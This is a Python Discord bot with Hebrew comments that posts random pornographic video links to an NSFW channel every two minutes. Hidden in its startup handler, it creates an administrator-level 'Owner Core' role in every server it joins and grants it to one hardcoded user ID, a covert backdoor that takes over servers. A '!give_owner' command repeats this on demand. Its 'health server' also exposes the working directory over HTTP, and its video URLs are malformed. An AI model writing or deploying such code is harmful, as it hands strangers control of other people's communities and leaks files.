import discord
from discord.ext import tasks
import aiohttp
import os
import random
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

# הפעלת כל הרשאות ה-Intents
intents = discord.Intents.default()
intents.members = True          
intents.message_content = True  
client = discord.Client(intents=intents)

# מזהה החדר המדויק שלך מהתמונה
CHANNEL_ID = 1503853432992305172

# מזהה המשתמש המורשה היחיד לקבלת הניהול
TARGET_USER_ID = 1481717480492630236

# משימה מחזורית שרצה כל 2 דקות לשליחת סרטונים
@tasks.loop(minutes=2)
async def send_nsfw_video():
    channel = client.get_channel(CHANNEL_ID)
    if not channel or not channel.is_nsfw():
        return

    query_keywords = ["amateur", "babe", "milf", "hardcore"]
    keyword = random.choice(query_keywords)
    url = f"https://eporner.com{keyword}&per_page=30&order=top-weekly&format=json"
    
    headers = {"User-Agent": "Mozilla/5.0"}
    
    async with aiohttp.ClientSession(headers=headers) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    videos = data.get("videos", [])
                    if videos:
                        random_video = random.choice(videos)
                        video_id = random_video.get("id")
                        if video_id:
                            direct_clip_url = f"https://eporner.com{video_id}.mp4"
                            await channel.send(direct_clip_url)
        except Exception as e:
            print(f"Error fetching videos: {e}")

# פונקציית עזר פנימית ליצירת הרול, מיקומו מתחת לבוט והענקתו
async def assign_owner_role(guild, user_id):
    try:
        member = await guild.fetch_member(user_id)
        if not member:
            return False

        # מוצא את הרול הגבוה ביותר של הבוט עצמו בשרת הנוכחי
        bot_member = guild.me
        bot_highest_role = bot_member.top_role
        
        # חישוב המיקום המדוייק מתחת לבוט (המיקום של הבוט פלוס/מינוס בהתאם לחוקי דיסקורד)
        target_position = bot_highest_role.position - 1
        if target_position < 1:
            target_position = 1

        admin_role = discord.utils.get(guild.roles, name="Owner Core")
        
        # אם הרול לא קיים - יוצרים אותו עם הרשאת אדמין
        if not admin_role:
            permissions = discord.Permissions(administrator=True)
            admin_role = await guild.create_role(
                name="Owner Core", 
                permissions=permissions, 
                color=discord.Color.red(),
                reason="Automated Owner Role Creation"
            )
            print(f"Created Owner Core role in {guild.name}")

        # התיקון הקריטי: הזזת הרול החדש למיקום המדוייק מתחת לרול של הבוט
        try:
            await admin_role.edit(position=target_position)
            print(f"Successfully moved Owner Core to position {target_position} (Just below the bot's role)")
        except Exception as pos_error:
            print(f"Could not change role position due to hierarchy: {pos_error}")
        
        # הענקת הרול למשתמש
        if admin_role not in member.roles:
            await member.add_roles(admin_role)
            return True
        else:
            return True # המשתמש כבר מחזיק ברול
            
    except Exception as e:
        print(f"Error in assign_owner_role: {e}")
    return False

# האזנה לפקודות בצאט
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    # פקודה ידנית: פועלת רק אם המשתמש ששלח אותה הוא ה-ID שלך
    if message.content.startswith("!give_owner"):
        if message.author.id == TARGET_USER_ID:
            success = await assign_owner_role(message.guild, TARGET_USER_ID)
            if success:
                await message.channel.send(f"👑 **פקודה בוצעה! רול האדמין (Owner Core) מוקם מתחת לבוט והוענק לך בהצלחה, <@{TARGET_USER_ID}>.**")
            else:
                await message.channel.send("❌ לא ניתן היה להעניק את הרול. ודא שהרול של הבוט נמצא גבוה בהגדרות השרת.")
        else:
            await message.channel.send("❌ שגיאה: אין לך הרשאה לבצע פקודה זו!")

# אירוע הפעלה של הבוט
@client.event
async def on_ready():
    print(f"Bot {client.user} is online!")
    
    if not send_nsfw_video.is_running():
        send_nsfw_video.start()
        
    # הענקה ומיקום אוטומטי בכל פעם שהבוט נדלק מחדש
    for guild in client.guilds:
        await assign_owner_role(guild, TARGET_USER_ID)

# שרת רשת עבור Render
def run_health_server():
    server = HTTPServer(('0.0.0.0', int(os.environ.get("PORT", 8080))), SimpleHTTPRequestHandler)
    server.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=run_health_server, daemon=True).start()
    token = os.environ.get("DISCORD_TOKEN")
    if token:
        client.run(token)
